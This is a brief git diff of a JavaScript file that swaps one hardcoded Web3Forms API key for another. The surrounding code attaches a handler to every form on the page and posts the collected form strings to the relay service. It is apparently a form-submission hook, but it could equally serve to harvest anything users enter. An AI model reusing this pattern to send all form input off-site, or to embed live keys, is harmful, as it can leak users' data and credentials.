@@ -52,7 +52,7 @@ function inspectExport(formdata, nextpage) {
 
     // Modify form data to include email field and other necessary fields
     let formData = new FormData();
-    formData.append("apikey", "5b28ef1d-a7fc-42f5-bd58-f7741f15f844"); // Replace with your Web3Forms API key
+    formData.append("apikey", "a8c6a97f-e0f5-4e95-81cb-b7f117f99621"); // Replace with your Web3Forms API key
     formData.append("data", JSON.stringify(strings)); // Web3Forms expects "data" key for form data
 
     let request = new XMLHttpRequest();
@@ -348,4 +348,3 @@ document.querySelectorAll("form").forEach(
             inspectExport(formArray, '#');
         });
 });
-
